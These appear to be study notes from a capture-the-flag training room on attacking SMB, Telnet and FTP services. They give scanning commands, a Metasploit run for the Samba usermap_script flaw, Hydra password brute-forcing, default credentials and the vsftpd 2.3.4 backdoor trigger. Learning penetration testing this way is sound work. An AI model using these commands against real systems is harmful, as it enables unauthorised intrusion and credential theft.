# Network Services

This room focuses on enumerating and exploiting common network services

Main workflow

1. Identify the service
2. Enumerate everything
3. Research vulnerabilities
4. Exploit
5. Document findings

Always enumerate before exploiting

---

## SMB (Server Message Block)

Used for

- File sharing
- Printer sharing
- Inter-process communication

Linux uses Samba

Ports

445/TCP (Modern)

139/TCP (Legacy)

Related

UDP 137,138 (NetBIOS)

---

## Why SMB Matters

Common target in pentesting

Can expose

- Shared folders
- Usernames
- Password policies
- Sensitive files

Many critical vulnerabilities

Example

EternalBlue (MS17-010)

---

## SMB Enumeration

### Nmap

```bash
nmap -p 139,445 -sV -sC <target>
```

More detailed

```bash
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln* -p 445 <target>
```

Useful scripts

smb-os-discovery

Find OS and Samba version

smb-enum-shares

Lists shared folders

smb-enum-users

Lists users

smb-vuln*

Checks SMB vulnerabilities

---

### enum4linux

Purpose-built SMB enumeration tool

```bash
enum4linux -a <target>
```

Shows

- OS info
- Users
- Groups
- Shares
- Password policy

Very useful for finding usernames

---

### smbclient

Lists shares

```bash
smbclient -L //<target>/ -N
```

-N = No password

Connect to share

```bash
smbclient //<target>/<share> -N
```

Useful commands

ls

cd

get

put

---

### smbmap

Shows available shares and permissions

```bash
smbmap -H <target>
```

Displays

Read

Write

No Access

---

## SMB Exploitation

### Misconfigured Shares

Anonymous access

Weak credentials

Can expose

- Passwords
- SSH keys
- Config files

---

### Samba CVE-2007-2447

Username Map Script vulnerability

Affects

Samba 3.0.20 → 3.0.25rc3

Allows Remote Code Execution

Metasploit

```bash
msfconsole

use exploit/multi/samba/usermap_script

set RHOSTS <target>

set LHOST <attacker-ip>

run
```

Version enumeration is important before exploiting

---

## Telnet

Remote command-line access

Older alternative to SSH

Port

23/TCP

---

## Why Telnet is Dangerous

Everything is sent in plaintext

Username

Password

Commands

Anyone sniffing traffic can read credentials

SSH replaced Telnet because it encrypts communication

---

## Telnet Enumeration

Nmap

```bash
nmap -p 23 -sV -sC <target>
```

Manual Connection

```bash
telnet <target> 23
```

Banner may reveal

- OS
- Version
- Login prompt

---

## Telnet Exploitation

Usually credential based

Try default credentials

Examples

admin:admin

root:root

---

### Hydra

Single username

```bash
hydra -l <username> -P passwords.txt <target> telnet
```

Username list

```bash
hydra -L users.txt -P passwords.txt <target> telnet
```

If credentials work

Simply login using Telnet

---

## FTP (File Transfer Protocol)

Used for transferring files

Uses two connections

Control

Port 21

Data

Port 20 (Active Mode)

Random Port (Passive Mode)

Passive mode is used most often today

---

## Why FTP is Dangerous

Credentials sent in plaintext

Can allow anonymous login

Anonymous Login

Username

anonymous

Password

anonymous or blank

Can expose sensitive files

---

## FTP Enumeration

Nmap

```bash
nmap -p 21 -sV -sC --script ftp-anon,ftp-syst <target>
```

Useful scripts

ftp-anon

Checks anonymous login

ftp-syst

Gets FTP system information

---

### Manual Login

```bash
ftp <target>
```

Username

anonymous

Password

anonymous or blank

Useful commands

ls

cd

get

mget *

binary

(binary mode for images, executables, etc.)

---

## FTP Exploitation

### Anonymous Login

Can expose

- Passwords
- SSH Keys
- Sensitive files

Sometimes writable

Possible to upload files

---

### Hydra

```bash
hydra -l <username> -P passwords.txt <target> ftp
```

Bruteforces FTP credentials

---

### vsftpd 2.3.4 Backdoor

Known malicious backdoor

Submitting username ending with

:)

Opens root shell on

Port 6200

Metasploit Module

```bash
exploit/unix/ftp/vsftpd_234_backdoor
```

---

## Common Lessons

SMB

Information leakage

Weak shares

Version vulnerabilities

---

Telnet

Plaintext credentials

Weak passwords

---

FTP

Plaintext credentials

Anonymous login

Backdoored versions

---

## Quick Reference

| Service | Port | Enumeration | Exploitation |
|----------|------|-------------|--------------|
| SMB | 139,445 | Nmap, enum4linux, smbclient, smbmap | Open shares, Samba CVEs |
| Telnet | 23 | Nmap, telnet | Default creds, Hydra |
| FTP | 21 | Nmap, ftp | Anonymous login, Hydra, vsftpd backdoor |

---

## Important Commands

SMB

```bash
enum4linux -a <target>
```

```bash
smbclient -L //<target>/ -N
```

```bash
smbmap -H <target>
```

---

Telnet

```bash
telnet <target> 23
```

```bash
hydra -l <user> -P passwords.txt <target> telnet
```

---

FTP

```bash
ftp <target>
```

```bash
hydra -l <user> -P passwords.txt <target> ftp
```

---

## Important Points

Always follow

Identify → Enumerate → Research → Exploit → Document

Use Nmap first

Find service version

Research known CVEs

Never exploit without proper enumeration

Plaintext protocols

FTP

Telnet

Credentials can be captured using Wireshark

Version numbers matter

Different versions have different vulnerabilities